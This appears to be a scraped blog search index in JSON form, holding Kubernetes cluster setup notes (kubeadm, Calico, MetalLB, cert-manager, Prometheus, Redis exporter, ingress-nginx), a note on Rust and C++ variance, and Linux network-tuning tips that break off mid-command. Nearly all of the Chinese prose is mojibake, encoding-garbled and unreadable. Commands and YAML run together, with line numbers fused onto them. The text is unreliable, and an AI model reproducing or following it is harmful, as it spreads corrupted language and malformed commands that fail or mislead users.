ipvs: Load balancing: Distributes incoming client requests across multiple servers, improving performance and availability. Failover: Automatically redirects traffic to a backup server if the primary server becomes unavailable. Persistence: Maintains client connections with a specific server, improving user experience for applications that require stateful connections. Health checks: Monitors the health of backend servers and prevents traffic from being sent to unhealthy servers. ipvs is commonly used in: Web servers: Distributing web traffic to multiple web servers. Application servers: Balancing requests to application servers. Databases: Load balancing database connections. k8s keyring 12345678curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.33/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg# echo 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.33/deb/ /' | sudo tee /etc/apt/sources.list.d/kubernetes.listecho 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://mirrors.tuna.tsinghua.edu.cn/kubernetes/core:/stable:/v1.33/deb/ /' | sudo tee /etc/apt/sources.list.d/kubernetes.listapt update 123apt-cache policy kubeadmapt-cache showpkg kubeadmapt-cache madison kubeadm é˜²æ­¢è‡ªåŠ¨æ›´æ–° 1apt-mark hold kubelet kubeadm kubectl è¿›å…¥æ–‡ä»¶kubeletï¼Œ1.30ç‰ˆæœ¬ä¹‹åéƒ½æ˜¯åœ¨ /etc/default/kubeletï¼Œä¹‹å‰ /etc/sysconfig/kubelet 123vim /etc/default/kubeletKUBELET_EXTRA_ARGS=\"--cgroup-driver=systemd\" 1systemctl enable kubelet cidr è§„åˆ’pod/serviceç½‘æ®µï¼ŒåŸåˆ™åªæœ‰ä¸€ä¸ªï¼šä¸‰ä¸ªç½‘æ®µä¸é‡å¤ï¼Œæ²¡æœ‰äº¤å‰å³å¯ å®¿ä¸»æœºç½‘æ®µï¼šå‰é¢å·²ç»è§„åˆ’è¿‡ã€‚å³ï¼š192.168.31.0/24 serviceç½‘æ®µï¼š10.96.0.0/12 podç½‘æ®µï¼š10.244.0.0/16 12# masterèŠ‚ç‚¹æ‰§è¡Œkubeadm init --kubernetes-version=1.33.3 --pod-network-cidr=10.244.0.0/16 --service-cidr=10.96.0.0/12 --image-repository=registry.aliyuncs.com/google_containers --cri-socket=unix:///var/run/cri-dockerd.sock --upload-certs --v=9 å‚æ•°é‡Šä¹‰ï¼š kubernetes-versionï¼šæŒ‡å®šk8sçš„ç‰ˆæœ¬ï¼Œ control-plane-endpointï¼šå¯ä»¥ç†è§£ä¸ºé›†ç¾¤masterçš„å‘½åï¼Œéšæ„å†™å³å¯ apiserver-advertise-addressï¼šé›†ç¾¤ä¸­masterçš„åœ°å€ pod-network-cidrï¼špodç½‘æ®µåœ°å€ï¼Œåªè¦ä¸ä¸é›†ç¾¤ç½‘æ®µå’Œserviceç½‘æ®µé‡å¤å³å¯ service-cidrï¼šserviceç½‘æ®µåœ°å€ï¼Œåªè¦ä¸ä¸é›†ç¾¤ç½‘æ®µå’Œpodç½‘æ®µé‡å¤å³å¯ image-repositoryï¼šæŒ‡å®šä½¿ç”¨å›½å†…é•œåƒ cri-socketï¼šæŒ‡å®šä½¿ç”¨çš„å®¹å™¨è¿è¡Œæ—¶ï¼Œå¦‚æœä½ ä½¿ç”¨çš„containerdå®¹å™¨ï¼Œé‚£å°±ä¸ç”¨å†™è¿™ä¸ªå‚æ•° vï¼šæ—¥å¿—çº§åˆ«ï¼Œ9è¡¨ç¤ºè¾“å‡ºçš„ä¿¡æ¯ä¼šå¾ˆè¯¦ç»† 123456789101112131415161718To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/configAlternatively, if you are the root user, you can run: export KUBECONFIG=/etc/kubernetes/admin.confYou should now deploy a pod network to the cluster.Run \"kubectl apply -f [podnetwork].yaml\" with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/Then you can join any number of worker nodes by running the following on each as root:kubeadm join 192.168.217.140:6443 --token xxxxxxxxxxxxxxxxx \\ --discovery-token-ca-cert-hash sha256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 1234# å…¶ä½™ workerèŠ‚ç‚¹æ‰§è¡Œ cri-socketæ˜¯æŒ‡å®šå®¹å™¨è¿è¡Œæ—¶ï¼Œå¦‚æœæ˜¯containerdï¼Œå¯ä»¥ä¸ç”¨å†™è¯¥å‚æ•°kubeadm join k8smaster:6443 --token xxxxxxxxxxxxxxxxx \\ --discovery-token-ca-cert-hash sha256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx \\ --cri-socket=unix:///var/run/cri-dockerd.sock 1kubectl get nodes calico Tutorial: Install Calico on single-host k8s cluster | Calico Documentation 1kubectl create -f https://raw.githubusercontent.com/projectcalico/calico/v3.30.2/manifests/tigera-operator.yaml 1wget https://raw.githubusercontent.com/projectcalico/calico/v3.30.2/manifests/custom-resources.yaml ä¿®æ”¹ custom-resources.yaml ä¸­çš„ pod cidr 10.244.0.0/16ï¼Œç„¶åç­‰å¾…ä¸Šä¸€ä¸ª create æ‰§è¡Œå®Œæˆï¼Œç„¶å 1kubectl create -f custom-resources.yaml 1watch kubectl get pod -n calico-system 1kubectl describe pod calico-node-pdf78 -n calico-system 1kubectl get cs é›†ç¾¤ç›®å‰è¿˜åªæœ‰ä¸€ä¸ªmasterèŠ‚ç‚¹ï¼Œè€Œk8sé›†ç¾¤é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸ä¼šæŠŠpodè°ƒåº¦åˆ°masterèŠ‚ç‚¹çš„ã€‚å¯ä»¥è§£é™¤è¿™ç§é™åˆ¶ï¼š 123456789# æŸ¥çœ‹ taint å…ˆkubectl describe node ray-vubuntukubectl taint nodes --all node-role.kubernetes.io/control-plane-# è®¾ç½®æ±¡ç‚¹kubectl taint nodes &lt;node-name&gt; key1=value1:NoSchedule# å»é™¤æ±¡ç‚¹kubectl taint nodes &lt;node-name&gt; key1:NoSchedule- reset opreation 123456789# kubeadm resetsudo kubeadm reset --force --cri-socket=unix:///var/run/cri-dockerd.socksudo rm -rf /root/.kubesudo rm -rf /etc/cni/net.dsudo rm -rf /etc/kubernetes/*sudo systemctl restart dockersudo systemctl restart kubelet metallb Documentation 1helm install metallb metallb/metallb -n metallb-system --create-namespace 1kubectl apply -f metallb/metallb-l2-pool.yaml 1234567891011121314151617181920---apiVersion: metallb.io/v1beta1kind: IPAddressPoolmetadata: name: production namespace: metallb-systemspec: # Production services will go here. Public IPs are expensive. addresses: - 10.69.220.50-10.69.220.70---apiVersion: metallb.io/v1beta1kind: L2Advertisementmetadata: name: l2network namespace: metallb-systemspec: ipAddressPools: - production k8s gateway Git 12helm repo add k8s_gateway https://ori-edge.github.io/k8s_gateway/helm install exdns --set domain=pop.dev.cn k8s_gateway/k8s-gateway -n gateway --create-namespace 1&#x2F;etc&#x2F;systemd&#x2F;resolved.conf ä¸­ä¿®æ”¹ DNS æ·»åŠ  gateway external ip cert manager 123# kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.18.2/cert-manager.yamlkubectl apply -f cert-manager/cert-manager.yaml openssl ç”Ÿæˆè¯ä¹¦ï¼Œæˆ–è€…è¯ä¹¦é“¾ï¼Œé…ç½®ä¸Š ca-key-pair 1kubectl create secret tls ca-key-pair --cert=tls/certs/ks-interm.pem --key=tls/keys/ks-interm.key.pem -n cert-manager 1kubectl apply -f cert-manager/ca-cluster-issuer.yaml æ£€æŸ¥è¯ä¹¦çš„è¯¦ç»†ä¿¡æ¯ openssl x509 -in &lt;(kubectl get secret simpleweb-tls -n default -o jsonpath='{.data.tls.crt}' | base64 -d) -text -noout openebs 12helm repo add openebs https://openebs.github.io/openebshelm repo update 1helm install openebs --namespace openebs openebs/openebs --set engines.replicated.mayastor.enabled=false --create-namespace å•èŠ‚ç‚¹å‡ºç°è°ƒåº¦é—®é¢˜ï¼Œå¯ä»¥å°†å‰¯æœ¬ä¹¦è®¾ç½®ä¸º1 kubectl -n openebs get sts openebs-loki -o yaml | grep -nA20 affinity kubectl -n openebs scale sts openebs-loki --replicas=1 promethus 12345helm repo add prometheus-community https://prometheus-community.github.io/helm-charts# helm repo add stable https://kubernetes-charts.storage.googleapis.com/helm repo update# helm show values prometheus-community/kube-prometheus-stack &gt; kube-prometheus-stack-values.yaml 1helm install prometheus prometheus-community/kube-prometheus-stack --namespace prometheus --create-namespace ç½‘ç»œé—®é¢˜è§£å†³æ–¹æ³•ä¸€ï¼š 12345# git clone https://github.com/prometheus-community/helm-charts.githelm dependency build charts/kube-prometheus-stack/helm install prometheus ./charts/kube-prometheus-stack --namespace prometheus --create-namespace port-forwardings Prometheus-UI â€‹ kubectl port-forward service/prometheus-kube-prometheus-prometheus 9090 Alert Manager UI â€‹ kubectl port-forward svc/prometheus-kube-prometheus-alertmanager 9093 Grafana â€‹ kubectl port-forward deployment/prometheus-grafana 3000 Grafana Dashboard credentials â€‹ user: admin â€‹ pwd: prom-operator (from values.yaml file set as default) pwd get from: kubectl --namespace prometheus get secrets prometheus-grafana -o jsonpath=\"{.data.admin-password}\" | base64 -d ; echo redis-exporter â€‹ kubectl port-forward service/redis-exporter-prometheus-redis-exporter 9121 exporter æ¯”å¦‚ redis exporter æµ‹è¯•ï¼š 1helm install redis-exporter prometheus-community/prometheus-redis-exporter -f prometheus-redis_values.yaml æµ‹è¯•ä¸€ä¸ª redis exporter åŒæ—¶ç›‘æ§å¤šä¸ª redis èŠ‚ç‚¹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158apiVersion: apps/v1kind: Deploymentmetadata: name: redis-master-1 labels: app: redis lg-scrape-redis: defaultspec: selector: matchLabels: app: redis role: master tier: backend replicas: 1 template: metadata: labels: app: redis role: master tier: backend spec: containers: - name: master image: redis imagePullPolicy: IfNotPresent resources: requests: cpu: 100m memory: 100Mi ports: - containerPort: 6379---apiVersion: v1kind: Servicemetadata: name: redis-master-1 labels: app: redis role: master tier: backend lg-scrape-redis: defaultspec: ports: - port: 6379 targetPort: 6379 nodePort: 30001 type: NodePort selector: app: redis role: master tier: backend---apiVersion: apps/v1kind: Deploymentmetadata: name: redis-master-2 labels: app: redis lg-scrape-redis: defaultspec: selector: matchLabels: app: redis role: master tier: backend replicas: 1 template: metadata: labels: app: redis role: master tier: backend spec: containers: - name: master image: redis imagePullPolicy: IfNotPresent resources: requests: cpu: 100m memory: 100Mi ports: - containerPort: 6379---apiVersion: v1kind: Servicemetadata: name: redis-master-2 labels: app: redis role: master tier: backend lg-scrape-redis: defaultspec: ports: - port: 6379 targetPort: 6379 nodePort: 30002 type: NodePort selector: app: redis role: master tier: backend---apiVersion: apps/v1kind: Deploymentmetadata: name: redis-master-3 labels: app: redisspec: selector: matchLabels: app: redis role: master tier: backend replicas: 1 template: metadata: labels: app: redis role: master tier: backend spec: containers: - name: master image: redis imagePullPolicy: IfNotPresent resources: requests: cpu: 100m memory: 100Mi ports: - containerPort: 6379---apiVersion: v1kind: Servicemetadata: name: redis-master-3 labels: app: redis role: master tier: backendspec: ports: - port: 6379 targetPort: 6379 nodePort: 30003 type: NodePort selector: app: redis role: master tier: backend exporter éƒ¨ç½²ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041apiVersion: apps/v1kind: Deploymentmetadata: labels: app: redis-exporter name: redis-exporterspec: replicas: 1 selector: matchLabels: app: redis-exporter template: metadata: labels: app: redis-exporter spec: containers: - name: redis-exporter image: oliver006/redis_exporter:latest imagePullPolicy: IfNotPresent resources: requests: cpu: 100m memory: 100Mi ports: - containerPort: 9121---apiVersion: v1kind: Servicemetadata: name: redis-exporter labels: app: redis-exporterspec: ports: - name: redis-exporter port: 9121 targetPort: 9121 selector: app: redis-exporter k8s sd ç›‘æ§é…ç½®ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758apiVersion: monitoring.coreos.com/v1alpha1kind: ScrapeConfigmetadata: name: k8s-sd-config namespace: default labels: release: prometheusspec: jobName: 'redis_exporter_k8s_sd' scrapeInterval: 10s kubernetesSDConfigs: - role: endpoints relabelings: - sourceLabels: [__meta_kubernetes_service_label_lg_scrape_redis] action: keep regex: default - targetLabel: __metrics_path__ replacement: /scrape - targetLabel: __param_target sourceLabels: [__address__] - targetLabel: __address__ replacement: redis-exporter.default.svc.cluster.local:9121 - action: labelmap regex: __meta_kubernetes_service_label_(.+) - sourceLabels: [__meta_kubernetes_namespace] action: replace targetLabel: kubernetes_namespace - sourceLabels: [__meta_kubernetes_service_name] action: replace targetLabel: kubernetes_name - sourceLabels: [__meta_kubernetes_pod_name] action: replace targetLabel: kubernetes_pod_name - sourceLabels: [__meta_kubernetes_pod_name] action: replace targetLabel: instance regex: (.*redis.*) # - sourceLabels: [__meta_kubernetes_pod_name] # action: keep # regex: (.*redis.*) # - sourceLabels: [__meta_kubernetes_pod_container_name] # action: keep # regex: (.*redis.*) # - sourceLabels: [__meta_kubernetes_pod_phase] # action: keep # regex: Running # - sourceLabels: [__meta_kubernetes_endpoints_name] # action: keep # regex: (.*redis.*) # - sourceLabels: [__meta_kubernetes_service_label_app_kubernetes_io_name] # action: keep # regex: (.*redis.*) # - sourceLabels: [__meta_kubernetes_service_name] # action: keep # regex: (.*redis.*) # - sourceLabels: [__meta_kuernetes_pod_label_app_kubernetes_io_name] # action: keep # regex: (.*redis.*) é€šè¿‡ http:://exporter_addr:9121/scrape?target=redis_addr:6379 æŸ¥çœ‹æŒ‡å®šç»“æœã€‚ k8s with private repository docker-secret 1234567apiVersion: v1kind: Secretmetadata: name: my-registry-keydata: .dockerconfigjson: base64-encoded-contents-of-.docker/config.json-filetype: kubernetes.io/dockerconfigjson deployment 123456789101112131415161718192021222324apiVersion: apps/v1kind: Deploymentmetadata: name: my-app labels: app: my-appspec: replicas: 1 selector: matchLabels: app: my-app template: metadata: labels: app: my-app spec: imagePullSecrets: - name: my-registry-key containers: - name: my-app image: privat-repo/my-app:1.3 imagePullPolicy: Always ports: - containerPort: 3000 print full docker login command for aws ecr â€‹ aws ecr get-login login in docker private repo â€‹ docker login -u username -p password generated file â€‹ cat .docker/config.json â€‹ cat .docker/config.json | base64 create docker login secret from config.json file â€‹ kubectl create secret generic my-registry-key â€‹--from-file=.dockerconfigjson=.docker/config.json â€‹--type=kubernetes.io/dockerconfigjson â€‹ kubectl create secret generic my-registry-key --from-file=.dockerconfigjson=.docker/config.json --type=kubernetes.io/dockerconfigjson â€‹ kubect get secret create docker login secret with login credentials â€‹ kubectl create secret docker-registry my-registry-key â€‹--docker-server=https://private-repo â€‹--docker-username=user â€‹--docker-password=pwd â€‹ kubectl create secret docker-registry my-registry-key --docker-server=https://private-repo --docker-username=user --docker-password=pwd access minikube console â€‹ minikube ssh copy config.json file from Minikube to my host â€‹ scp -i \\((minikube ssh-key) docker@\\)(minikube ip):.docker/config.json .docker/config.json ingress nginx 1kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.13.0/deploy/static/provider/cloud/deploy.yaml æµ‹è¯•é…ç½® 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586---apiVersion: apps/v1kind: Deploymentmetadata: name: simple-web namespace: default labels: app: simple-webspec: replicas: 1 selector: matchLabels: app: simple-web template: metadata: labels: app: simple-web spec: containers: - name: httpd image: httpd:latest ports: - containerPort: 80 resources: requests: memory: \"64Mi\" cpu: \"50m\" limits: memory: \"128Mi\" cpu: \"100m\"---apiVersion: v1kind: Servicemetadata: name: simple-web-service namespace: default labels: app: simple-webspec: selector: app: simple-web ports: - port: 80 targetPort: 80 protocol: TCP type: ClusterIP---apiVersion: cert-manager.io/v1kind: Certificatemetadata: name: simpleweb-tls namespace: defaultspec: secretName: simpleweb-tls issuerRef: name: ca-issuer kind: ClusterIssuer commonName: simpleweb.dev.lg.com dnsNames: - simpleweb.dev.lg.com---apiVersion: networking.k8s.io/v1kind: Ingressmetadata: name: simpleweb-ingress namespace: default annotations: cert-manager.io/cluster-issuer: ca-issuer nginx.ingress.kubernetes.io/ssl-redirect: \"true\"spec: ingressClassName: nginx tls: - hosts: - simpleweb.dev.lg.com secretName: simpleweb-tls rules: - host: simpleweb.dev.lg.com http: paths: - path: / pathType: Prefix backend: service: name: simple-web-service port: number: 80","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"k8s","slug":"Notes/k8s","permalink":"https://racleray.github.io/categories/Notes/k8s/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/tags/Notes/"},{"name":"k8s","slug":"k8s","permalink":"https://racleray.github.io/tags/k8s/"}],"author":"HeRui"},{"title":"é™æ€ç±»å‹è¯­è¨€é»‘è¯-åå˜","slug":"é™æ€ç±»å‹è¯­è¨€é»‘è¯-åå˜","date":"2025-03-05T12:18:38.464Z","updated":"2025-03-05T13:11:47.146Z","comments":true,"path":"posts/d4de3325.html","link":"","permalink":"https://racleray.github.io/posts/d4de3325.html","excerpt":"é™æ€ç±»å‹è¯­è¨€åå˜åå˜Note","text":"Rust ä¸­çš„åå˜å’Œåå˜ åå˜ï¼ˆCovariantï¼‰ï¼šå¦‚æœ A æ˜¯ B çš„å­ç±»å‹ï¼ˆA &lt;: Bï¼‰ï¼Œé‚£ä¹ˆ Container&lt;A&gt; ä¹Ÿæ˜¯ Container&lt;B&gt; çš„å­ç±»å‹ã€‚ é€†å˜/åå˜ï¼ˆContravariantï¼‰ï¼šå¦‚æœ A æ˜¯ B çš„å­ç±»å‹ï¼ˆA &lt;: Bï¼‰ï¼Œé‚£ä¹ˆ Function&lt;B&gt; åå‘æˆä¸º Function&lt;A&gt; çš„å­ç±»å‹ã€‚ Rust ä¸­çš„åå˜ åœ¨ Rust é‡Œï¼Œå¦‚æœ T çš„ç”Ÿå‘½å‘¨æœŸ 'a æ˜¯ 'b çš„å­ç”Ÿå‘½å‘¨æœŸï¼ˆ'a &lt;: 'bï¼‰ï¼Œé‚£ä¹ˆ &amp;'a T ä¹Ÿæ˜¯ &amp;'b T çš„å­ç±»å‹ã€‚è¿™æ„å‘³ç€ &amp;'a T æ˜¯ åå˜çš„ï¼ˆcovariantï¼‰ã€‚ 12345678struct Container&lt;'a, T&gt;(&amp;'a T);fn co_variant&lt;'short, 'long&gt;(long: Container&lt;'long, i32&gt;) -&gt; Container&lt;'short, i32&gt;where 'long: 'short, // 'long ç”Ÿå‘½å‘¨æœŸæ¯” 'short é•¿&#123; long // å…è®¸è½¬æ¢ï¼Œå› ä¸º Container&lt;'a, T&gt; å¯¹ 'a æ˜¯åå˜çš„&#125; åå˜çš„æ„ä¹‰ å…è®¸ç”Ÿå‘½å‘¨æœŸç¼©çŸ­ï¼ˆå³æ›´â€œçŸ­æš‚â€çš„å€Ÿç”¨å¯ä»¥æ›¿ä»£â€œé•¿ä¹…â€çš„å€Ÿç”¨ï¼‰ã€‚ å¸¸è§äºä¸å¯å˜å¼•ç”¨ï¼Œå› ä¸ºä¸å¯å˜æ•°æ®ä¸ä¼šè¢«ä¿®æ”¹ï¼Œæ‰€ä»¥ç¼©çŸ­å¼•ç”¨æ˜¯å®‰å…¨çš„ã€‚ Rust ä¸­ *mut æ˜¯ invariant ï¼Œä¸èƒ½è¢«å­ç±»å‹åŒ–ï¼Œè€Œ NonNull&lt;T&gt; æ˜¯åå˜çš„ã€‚å…¶å®ç°æ–¹å¼ï¼Œæ˜¯é€šè¿‡è½¬æ¢ä¸º *const T çš„æ–¹å¼ï¼Œè€Œ *const T æ˜¯åå˜çš„ã€‚ &amp;'a mut T å¯¹äº 'a æ¥è¯´æ˜¯åå˜( covariant )çš„ï¼Œä½†æ˜¯å¯¹äº T æ˜¯ä¸å˜çš„( invariant )ã€‚ 12345678910pub struct NonNull&lt;T&gt; &#123; pointer: *const T,&#125;impl&lt;T&gt; NonNull&lt;T&gt; &#123; pub unsafe fn new_unchecked(ptr: *mut T) -&gt; Self &#123; // SAFETY: the caller must guarantee that `ptr` is non-null. unsafe &#123; NonNull &#123; pointer: ptr as *const T &#125; &#125; &#125;&#125; å¦å¤–ï¼Œå¦‚æœä½¿ç”¨ NonNull&lt;T&gt; ä½œä¸ºä¸€ä¸ªç±»çš„æˆå‘˜ï¼Œä¸ºäº†ä¸å—åˆ°ä¸€äº›é—´æ¥å› ç´ çš„å½±å“ï¼Œç±»å‹æ“¦é™¤æˆ–è€…å…¶å®ƒé—´æ¥çš„ä»€ä¹ˆåŸå› ï¼Œä½¿ç”¨ä¸€ä¸ª _boo: PhantomData&lt;T&gt; æˆå‘˜ï¼Œæ¥å‘Šè¯‰ç¼–è¯‘å™¨ï¼ŒNonNull ä¸­ä¸€å®šæ˜¯ä¸€ä¸ª T ç±»å‹ã€‚ Rust ä¸­çš„åå˜ åœ¨ Rust é‡Œï¼Œå‡½æ•°å‚æ•°çš„ç”Ÿå‘½å‘¨æœŸæ˜¯é€†å˜ï¼ˆcontravariantï¼‰ çš„ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœ 'a &lt;: 'bï¼Œé‚£ä¹ˆ fn(&amp;'b i32) -&gt; () å¯ä»¥èµ‹å€¼ç»™ fn(&amp;'a i32) -&gt; ()ã€‚ 123456fn contravariant_example&lt;'short, 'long&gt;(func: fn(&amp;'short i32)) -&gt; fn(&amp;'long i32)where 'long: 'short, // 'long ç”Ÿå‘½å‘¨æœŸæ¯” 'short é•¿&#123; func // å…è®¸è½¬æ¢ï¼Œå› ä¸ºå‡½æ•°å‚æ•°çš„ç”Ÿå‘½å‘¨æœŸæ˜¯é€†å˜çš„&#125; åå˜çš„æ„ä¹‰ é˜²æ­¢ä¸å®‰å…¨çš„ç”Ÿå‘½å‘¨æœŸæ‰©å±•ï¼ˆå³ä¸èƒ½è®©çŸ­ç”Ÿå‘½å‘¨æœŸçš„æ•°æ®è¢«é•¿ç”Ÿå‘½å‘¨æœŸçš„å‡½æ•°å¼•ç”¨ï¼‰ã€‚ å¸¸è§äºå‡½æ•°æŒ‡é’ˆæˆ–é—­åŒ…ï¼Œå› ä¸ºè°ƒç”¨æ–¹å¯ä»¥ä¼ é€’æ›´å…·ä½“çš„å‚æ•°ç±»å‹ï¼Œè€Œä¸å½±å“è°ƒç”¨ã€‚ C++ ä¸­çš„åå˜å’Œåå˜ åœ¨ C++ï¼Œåå˜å’Œåå˜ä¸»è¦ä½“ç°åœ¨ç»§æ‰¿å’Œæ¨¡æ¿çš„ä¸Šä¸‹ç•Œè§„åˆ™ï¼Œç‰¹åˆ«æ˜¯ è¿”å›å€¼ï¼ˆåå˜ï¼‰å’Œå‚æ•°ï¼ˆé€†å˜ï¼‰ çš„ç»§æ‰¿å…³ç³»ã€‚ C++ ä¸­çš„åå˜ å¦‚æœæ´¾ç”Ÿç±» Derived ç»§æ‰¿äº† Baseï¼Œé‚£ä¹ˆè¿”å› Derived* çš„å‡½æ•°å¯ä»¥è¦†ç›–è¿”å› Base* çš„å‡½æ•°ï¼ˆè¿”å›å€¼æ˜¯åå˜çš„ï¼‰ã€‚ 123456789class Base &#123;public: virtual Base* get() &#123; return this; &#125;&#125;;class Derived : public Base &#123;public: Derived* get() override &#123; return this; &#125; // å…è®¸ï¼Œè¿”å›å€¼æ˜¯åå˜çš„&#125;; åå˜çš„æ„ä¹‰ å…è®¸æ›´å…·ä½“çš„è¿”å›ç±»å‹ï¼Œä½¿å¾—è°ƒç”¨è€…å¯ä»¥è·å¾—æ›´å…·ä½“çš„å¯¹è±¡ï¼Œè€Œä¸éœ€è¦é¢å¤–çš„ç±»å‹è½¬æ¢ã€‚ C++ ä¸­çš„åå˜ åœ¨ C++ ä¸­ï¼Œå‡½æ•°å‚æ•°æ˜¯é€†å˜çš„ã€‚å¦‚æœ Derived ç»§æ‰¿è‡ª Baseï¼Œåˆ™ void func(Derived*) ä¸èƒ½æ›¿ä»£ void func(Base*)ï¼Œä½†åè¿‡æ¥å¯ä»¥ã€‚ 12345678910class Base &#123;&#125;;class Derived : public Base &#123;&#125;;void acceptBase(Base* b) &#123;&#125;void acceptDerived(Derived* d) &#123;&#125;using FuncType = void (*)(Derived*);FuncType funcPtr = acceptBase; // âŒ é”™è¯¯ï¼Œå‚æ•°ç±»å‹æ˜¯é€†å˜çš„ åå˜çš„æ„ä¹‰ é˜²æ­¢å­ç±»å¯¹è±¡è¢«é”™è¯¯åœ°å½“ä½œçˆ¶ç±»å¤„ç†ï¼Œå› ä¸ºå­ç±»å¯èƒ½æœ‰é¢å¤–çš„å­—æ®µæˆ–è¡Œä¸ºã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"Linuxç½‘ç»œä¼˜åŒ–","slug":"Linuxç½‘ç»œä¼˜åŒ–","date":"2025-03-02T03:29:45.000Z","updated":"2025-03-02T03:35:16.222Z","comments":true,"path":"posts/be40d60e.html","link":"","permalink":"https://racleray.github.io/posts/be40d60e.html","excerpt":"Linux kernel network optimise","text":"1. æ£€æŸ¥æ˜¯å¦å•æ ¸è½¯ä¸­æ–­å¤ªé«˜ 2. æ£€æŸ¥æ˜¯å¦å¼€å¯ RPSï¼ŒæŠ¥æ–‡æ˜¯å¦é€‚åˆ RPS ç®—æ³• RPS çš„å·¥ä½œåŸç† å¤šæ ¸å¤„ç†å™¨ç¯å¢ƒï¼šå½“æœåŠ¡å™¨å…·æœ‰å¤šä¸ª CPU æ ¸å¿ƒæ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„ç½‘ç»œæ•°æ®åŒ…å¯èƒ½ä¼šè¢«å‘é€åˆ°å•ä¸ªæ ¸å¿ƒè¿›è¡Œå¤„ç†ã€‚è¿™ä¼šä½¿å¾—è¯¥æ ¸å¿ƒæ‰¿æ‹…æ‰€æœ‰çš„ç½‘ç»œè´Ÿè½½ï¼Œå¯¼è‡´æ€§èƒ½ç“¶é¢ˆã€‚ æ•°æ®åŒ…åˆ†é…ï¼šRPS çš„ä¸»è¦ç›®çš„æ˜¯åœ¨å¤šä¸ªå¤„ç†æ ¸å¿ƒä¹‹é—´åˆ†é…æ¥æ”¶åˆ°çš„ç½‘ç»œæ•°æ®åŒ…ã€‚è¿™æ˜¯é€šè¿‡å°†æ•°æ®åŒ…æ ¹æ®ç‰¹å®šçš„å“ˆå¸Œç®—æ³•åˆ†é…åˆ°ä¸åŒçš„ CPU æ ¸å¿ƒï¼Œä»è€Œå®ç°è´Ÿè½½å‡è¡¡ã€‚ æå‡æ€§èƒ½ï¼šé€šè¿‡å°†ç½‘ç»œæ•°æ®åŒ…åˆ†æ•£åˆ°å¤šä¸ªæ ¸å¿ƒå¤„ç†ï¼ŒRPS å¯ä»¥æé«˜æ•´ä½“ç½‘ç»œæ€§èƒ½å’Œæ•°æ®å¤„ç†èƒ½åŠ›ï¼Œé™ä½å•ä¸ªæ ¸å¿ƒçš„è´Ÿè½½ï¼Œä»è€Œé˜²æ­¢æ‹¥å¡ã€‚ RPS çš„é…ç½® åœ¨ Linux ç³»ç»Ÿä¸­ï¼ŒRPS å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤è¿›è¡Œé…ç½®ï¼š æ£€æŸ¥ RPS æ˜¯å¦å¯ç”¨ï¼šå¯ä»¥é€šè¿‡æŸ¥çœ‹ /proc/sys/net/core/rps_sock_flow_entries æ–‡ä»¶æ¥æ£€æŸ¥ RPS çš„çŠ¶æ€ã€‚ è®¾ç½® RPSï¼š é€šè¿‡å†™å…¥ç‰¹å®šçš„å€¼åˆ° /proc/sys/net/core/rps_sock_flow_entries æ–‡ä»¶ï¼Œå¯ä»¥è°ƒæ•´ RPS çš„è¡Œä¸ºã€‚ è¿˜å¯ä»¥é€šè¿‡è®¾ç½®ç½‘å¡çš„ RX (æ¥æ”¶) å¤„ç†é˜Ÿåˆ—ï¼Œå°†æ¥æ”¶åˆ°çš„æ•°æ®åŒ…å¼•å¯¼åˆ°ä¸åŒçš„ CPU æ ¸å¿ƒã€‚ ä½¿ç”¨ tc å‘½ä»¤ï¼šå¯ä»¥ä½¿ç”¨ tc å‘½ä»¤è¿›è¡Œé«˜çº§æµé‡æ§åˆ¶ï¼Œä»¥ä¾¿æ›´ç²¾ç»†åœ°æ§åˆ¶ RPSã€‚ 3. ç»‘æ ¸è®¾ç½®æ˜¯å¦æ­£ç¡® 4. ç½‘å¡å‚æ•°æ£€æŸ¥è°ƒæ•´ 1234567891011121314# æŸ¥çœ‹é˜Ÿåˆ— buffethtool -g enp1s0# è®¾ç½®é˜Ÿåˆ— buffethtool -G enp1s0 max# æŸ¥çœ‹ç½‘å¡ offloadethtool -k enp1s0# è®¾ç½®ç½‘å¡ç‰¹æ€§ethtool -K enp1s0 rx on# RSS é˜Ÿåˆ—æŸ¥çœ‹ethtool -x enp1s0# RSS é˜Ÿåˆ—è®¾ç½®ethtool -X enp1s0 xxx 5. æ£€æŸ¥ç½‘å¡ä¸­æ–­é…ç½®æ˜¯å¦æ­£ç¡® 1234cat /proc/interrupts# è°ƒæ•´ irqbalanceecho mask &gt; 